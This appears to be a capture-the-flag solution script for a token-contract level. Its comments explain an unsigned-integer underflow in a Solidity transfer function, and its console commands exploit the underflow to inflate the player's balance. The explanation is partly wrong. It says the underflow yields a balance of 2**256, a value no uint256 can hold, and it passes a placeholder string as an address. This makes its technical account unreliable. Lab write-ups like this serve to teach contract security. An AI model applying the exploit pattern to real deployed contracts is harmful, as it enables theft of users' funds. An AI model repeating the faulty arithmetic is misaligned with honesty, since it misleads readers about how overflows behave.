/*
    This problem is related to underflows and overflows
    We have already 20 tokens, and if we send someone 21 tokens which seems kind of impossible but wait, we do have uint here which means a positive number always
    So by this we will get a higher balance due to integer overflow, let's see how it gets
*/

// This line will show our current balance which gonna be 20 tokens
await contract.balanceOf(player)

/*
    Look at this code now :

    function transfer(address _to, uint _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    here, _to will be someone's else address and value -> 21
    then 20 - 21 = -1 -> 2**256, As 2**256 - 1 = higher uint value
    and balance will be 2**256, gotcha

    Now implement this all with the following code line in your console
*/

await contract.transfer("fake-address", 21)